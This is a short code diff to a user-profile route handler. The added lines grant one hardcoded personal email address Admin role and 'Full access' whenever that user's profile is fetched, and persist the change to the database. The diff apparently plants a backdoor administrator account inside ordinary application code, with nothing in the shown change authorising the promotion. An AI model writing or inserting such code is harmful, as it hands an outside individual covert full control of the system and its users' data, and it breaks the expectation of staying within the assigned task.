@@ -34,6 +34,12 @@ export const getUserProfile = async (req, res) => {
     }
 
     const data = docSnapshot.data();
+    if (email === "umar2491812@gmail.com" && data.role !== "Admin") {
+      data.role = "Admin";
+      data.access = "Full access";
+      await userDocRef.update({ role: "Admin", access: "Full access" });
+      console.log(`Proactively promoted existing user ${email} to Admin in database.`);
+    }
     return res.json(data);
   } catch (error) {
     console.error("Error fetching user profile:", error);
